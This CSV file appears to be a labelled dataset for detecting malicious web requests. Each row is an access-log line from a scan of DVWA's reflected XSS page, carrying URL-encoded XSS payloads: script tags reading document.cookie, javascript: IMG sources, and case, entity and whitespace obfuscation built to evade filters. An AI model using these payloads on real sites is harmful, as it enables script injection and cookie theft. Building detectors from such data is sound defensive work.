url,malicious
"127.0.0.1 - - [03/May/2021:02:18:52 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%22%3e%3cscript%3e%22 HTTP/1.1"" 200 1662 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:18:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3ealert(%22WXSS%22)%3c%2fscript%3e HTTP/1.1"" 200 1671 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:18:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3c%3cscript%3ealert(%22WXSS%22)%3b%2f%2f%3c%3c%2fscript%3e HTTP/1.1"" 200 1676 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:18:54 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3ealert(document%2ecookie)%3c%2fscript%3e HTTP/1.1"" 200 1678 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:18:54 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name='%3e%3cscript%3ealert(document%2ecookie)%3c%2fscript%3e HTTP/1.1"" 200 1680 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:18:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name='%3e%3cscript%3ealert(document%2ecookie)%3b%3c%2fscript%3e HTTP/1.1"" 200 1681 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:18:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%5c%22%3balert('XSS')%3b%2f%2f HTTP/1.1"" 200 1671 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:18:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3ealert(%22WXSS%22)%3b%3c%2fscript%3e HTTP/1.1"" 200 1672 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:18:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3ealert(document%2ecookie)%3b%3c%2fscript%3e HTTP/1.1"" 200 1679 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:18:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%22X%20SS%22)%3b%3C%2fscript%3E HTTP/1.1"" 200 1673 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:18:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%26ltscript%26gtalert(document%2ecookie)%3b%3c%2fscript%3e HTTP/1.1"" 200 1683 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:19:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%26ltscript%26gtalert(document%2ecookie)%3b%26ltscript%26gtalert HTTP/1.1"" 200 1683 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:19:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cxss%3e%3cscript%3ealert('WXSS')%3c%2fscript%3e%3c%2fvulnerable%3e HTTP/1.1"" 200 1681 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:19:02 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d'javascript%3aalert(document%2ecookie)'%3e HTTP/1.1"" 200 1687 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:19:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d%22javascript%3aalert('WXSS')%3b%22%3e HTTP/1.1"" 200 1682 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:19:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d%22javascript%3aalert('WXSS')%22 HTTP/1.1"" 200 1680 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:19:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3djavascript%3aalert('WXSS')%3e HTTP/1.1"" 200 1680 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:19:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3dJaVaScRiPt%3aalert('WXSS')%3e HTTP/1.1"" 200 1685 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:19:08 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3djavascript%3aalert(%26quot%3bWXSS%26quot%3b)%3e HTTP/1.1"" 200 1684 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:19:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d%60javascript%3aalert(%22'WXSS'%22)%60%3e HTTP/1.1"" 200 1684 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:19:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20%22%22%22%3e%3cSCRIPT%3ealert(%22WXSS%22)%3c%2fSCRIPT%3e%22%3e HTTP/1.1"" 200 1684 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:19:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3djavascript%3aalert(String%2efromCharCode(88,83,83))%3e HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:19:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d'javasc ript%3aalert(document%2ecookie)'%3e"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:19:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d%22jav ascript%3aalert('WXSS')%3b%22%3e"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:19:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d%22jav%26#x09%3bascript%3aalert('WXSS')%3b%22%3e HTTP/1.1"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:19:20 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d%22jav%26#x0A%3bascript%3aalert('WXSS')%3b%22%3e HTTP/1.1"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:19:20 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 200 5294 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=%3cscript%3ealert(%22WXSS%22)%3c%2fscript%3e"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36""",1
"127.0.0.1 - - [03/May/2021:02:19:22 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d%22jav%26#x0D%3bascript%3aalert('WXSS')%3b%22%3e HTTP/1.1"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:19:24 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d%22%20%26#14%3b%20javascript%3aalert('WXSS')%3b%22%3e HTTP/1.1"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:19:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20DYNSRC%3d%22javascript%3aalert('WXSS')%22%3e HTTP/1.1"" 200 1684 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:19:28 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20LOWSRC%3d%22javascript%3aalert('WXSS')%22%3e HTTP/1.1"" 200 1684 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:19:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d'%26%23x6a%3bavasc%26%23000010ript%3aa%26%23x6c%3bert(document%2e%26%23x63%3bookie)'%3e HTTP/1.1"" 200 1710 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:19:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d%26#106%3b%26#97%3b%26#118%3b%26#97%3b%26#115%3b%26#99%3b%26#114%3b%26#105%3b%26#112%3b%26#116%3b%26#58%3b%26#97%3b%26#108%3b%26#101%3b%26#114%3b%26#116%3b%26#40%3b%26#39%3b%26#88%3b%26#83%3b%26#83%3b%26#39%3b%26#41%3b%3e HTTP/1.1"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:19:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d%26#0000106%26#0000097%26#0000118%26#0000097%26#0000115%26#0000099%26#0000114%26#0000105%26#0000112%26#0000116%26#0000058%26#0000097%26#0000108%26#0000101%26#0000114%26#0000116%26#0000040%26#0000039%26#0000088%26#0000083%26#0000083%26#0000039%26#0000041%3e HTTP/1.1"" 400 0 ""-"" ""-""",1
